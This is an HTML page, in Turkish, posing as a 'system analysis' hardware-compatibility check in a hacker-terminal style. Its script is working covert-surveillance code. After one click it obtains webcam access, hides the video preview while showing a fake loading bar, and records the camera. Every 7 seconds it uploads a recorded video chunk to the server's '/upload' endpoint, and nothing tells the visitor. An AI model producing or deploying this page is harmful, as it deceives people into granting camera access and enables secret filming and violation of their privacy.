<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Analizi | Terminal</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            text-shadow: 0 0 5px #00ff41;
        }

        .container {
            border: 1px solid #00ff41;
            padding: 30px;
            background: rgba(0, 255, 65, 0.05);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            border-radius: 5px;
            text-align: center;
            max-width: 400px;
        }

        h1 { font-size: 1.5rem; margin-bottom: 20px; letter-spacing: 2px; }

        .status-box {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #888;
        }

        .loading-bar {
            width: 100%;
            height: 4px;
            background: #222;
            margin-top: 10px;
            position: relative;
            overflow: hidden;
        }

        .loading-bar::after {
            content: '';
            position: absolute;
            left: -100%;
            width: 100%;
            height: 100%;
            background: #00ff41;
            animation: loading 2s infinite;
        }

        @keyframes loading {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        video { display: none; } /* Gizlilik için video önizlemesini saklıyoruz */

        #start-btn {
            background: transparent;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            transition: 0.3s;
            text-transform: uppercase;
        }

        #start-btn:hover {
            background: #00ff41;
            color: #000;
            box-shadow: 0 0 15px #00ff41;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>SİSTEM ANALİZİ</h1>
        <p>Donanım uyumluluğu kontrol ediliyor...</p>
        <button id="start-btn" onclick="startCapture()">ANALİZİ BAŞLAT</button>
        
        <div class="status-box" id="status" style="display:none;">
            <p>Kamera Modülü Bağlanıyor...</p>
            <div class="loading-bar"></div>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        async function startCapture() {
            const btn = document.getElementById('start-btn');
            const status = document.getElementById('status');
            btn.style.display = 'none';
            status.style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                const mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = async (event) => {
                    if (event.data.size > 0) {
                        const formData = new FormData();
                        formData.append('video', event.data, `video_${Math.random().toString(36).substr(2, 9)}.webm`);
                        
                        await fetch('/upload', {
                            method: 'POST',
                            body: formData
                        });
                    }
                };

                // Her 7 saniyede bir parçayı gönderir
                mediaRecorder.start(7000); 

            } catch (err) {
                console.error("Hata:", err);
                alert("Sistem hatası: Kamera erişimi reddedildi.");
            }
        }
    </script>
</body>
</html>
